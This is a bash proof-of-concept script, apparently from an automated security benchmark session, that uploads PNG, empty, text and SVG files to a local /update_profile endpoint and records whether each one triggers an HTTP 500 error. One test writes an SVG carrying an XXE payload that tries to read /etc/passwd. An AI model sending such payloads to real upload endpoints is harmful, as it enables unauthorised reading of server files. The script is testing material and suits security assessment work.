#!/bin/bash
# POC: Demonstrates HTTP 500 Internal Server Error for all file uploads to /update_profile endpoint, indicating unhandled backend exception or crash in file processing logic
# Target: ./repo
# Created: 2025-11-07T16:11:12.866Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# File Upload Backend Processing Error POC
# Tests that /update_profile endpoint returns HTTP 500 for all file uploads
# regardless of file type, content, or format

TARGET_URL="${1:-http://localhost}"
ENDPOINT="/update_profile"
FULL_URL="$TARGET_URL$ENDPOINT"

echo "=========================================="
echo "File Upload Backend Error POC"
echo "=========================================="
echo "Target: $FULL_URL"
echo ""

# Create test files in /tmp
echo "Creating test files..."
echo "PNG test" > /tmp/test.png 2>/dev/null
echo "" > /tmp/empty.png 2>/dev/null
echo "This is a text file" > /tmp/test.txt 2>/dev/null
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' > /tmp/xxe.svg 2>/dev/null

echo ""
echo "Test 1: Valid PNG file upload"
echo "Command: curl -s -o /dev/null -w '%{http_code}' -F 'image_profile=@/tmp/test.png' $FULL_URL"
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' -F 'image_profile=@/tmp/test.png' "$FULL_URL")
echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ]; then
    echo "✓ CONFIRMED: HTTP 500 error on valid PNG upload"
else
    echo "✗ Expected 500, got $HTTP_CODE"
fi
echo ""

echo "Test 2: Empty file upload"
echo "Command: curl -s -o /dev/null -w '%{http_code}' -F 'image_profile=@/tmp/empty.png' $FULL_URL"
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' -F 'image_profile=@/tmp/empty.png' "$FULL_URL")
echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ]; then
    echo "✓ CONFIRMED: HTTP 500 error on empty file upload"
else
    echo "✗ Expected 500, got $HTTP_CODE"
fi
echo ""

echo "Test 3: Text file upload"
echo "Command: curl -s -o /dev/null -w '%{http_code}' -F 'image_profile=@/tmp/test.txt' $FULL_URL"
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' -F 'image_profile=@/tmp/test.txt' "$FULL_URL")
echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ]; then
    echo "✓ CONFIRMED: HTTP 500 error on text file upload"
else
    echo "✗ Expected 500, got $HTTP_CODE"
fi
echo ""

echo "Test 4: SVG with XXE payload"
echo "Command: curl -s -o /dev/null -w '%{http_code}' -F 'image_profile=@/tmp/xxe.svg' $FULL_URL"
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' -F 'image_profile=@/tmp/xxe.svg' "$FULL_URL")
echo "HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "500" ]; then
    echo "✓ CONFIRMED: HTTP 500 error on SVG file upload"
else
    echo "✗ Expected 500, got $HTTP_CODE"
fi
echo ""

echo "Test 5: Detailed response from file upload"
echo "Command: curl -v -F 'image_profile=@/tmp/test.png' $FULL_URL 2>&1"
echo ""
curl -v -F 'image_profile=@/tmp/test.png' "$FULL_URL" 2>&1 | head -30
echo ""

echo "=========================================="
echo "Summary: All file uploads consistently return HTTP 500"
echo "This indicates an unhandled exception in backend file processing"
echo "=========================================="